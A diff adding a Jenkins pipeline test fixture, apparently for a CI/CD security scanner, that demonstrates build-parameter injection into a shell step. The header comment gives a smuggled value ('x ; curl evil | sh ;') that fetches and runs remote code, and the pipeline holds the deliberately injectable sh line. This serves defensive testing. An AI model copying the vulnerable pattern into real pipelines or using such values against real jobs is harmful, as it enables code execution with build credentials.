@@ -1,0 +1,30 @@
+// scenarios/128-jenkins-params-injection
+// CICD-SEC-4 (Poisoned Pipeline Execution) — Jenkins — HIGH
+//
+// Pattern: a build parameter (`params.X`) is interpolated into a double-quoted
+// `sh` body. A `string` parameter is free-form text set by whoever queues the
+// run (anyone with Build permission, an upstream `build job:`, a webhook), and
+// Groovy substitutes it BEFORE the shell parses the line — so
+// `IMAGE_TAG = 'x ; curl evil | sh ;'` runs the injected command on the agent in
+// the build's full credential context. The Jenkins peer of the GHA
+// `${{ inputs.X }}` / ADO `${{ parameters.X }}` injection rules.
+//
+// SAFETY: static fixture, nested under scenarios/ — Jenkins runs only the
+// Jenkinsfile a job is configured to point at; nothing here points at this one.
+// See README.md.
+
+pipeline {
+  agent any
+  parameters {
+    string(name: 'IMAGE_TAG', defaultValue: 'latest')
+  }
+  stages {
+    stage('build') {
+      steps {
+        // DANGER — ${params.IMAGE_TAG} is spliced into the double-quoted body
+        // before the shell parses it; a crafted value breaks out of the command.
+        sh "docker build -t myapp:${params.IMAGE_TAG} ."
+      }
+    }
+  }
+}
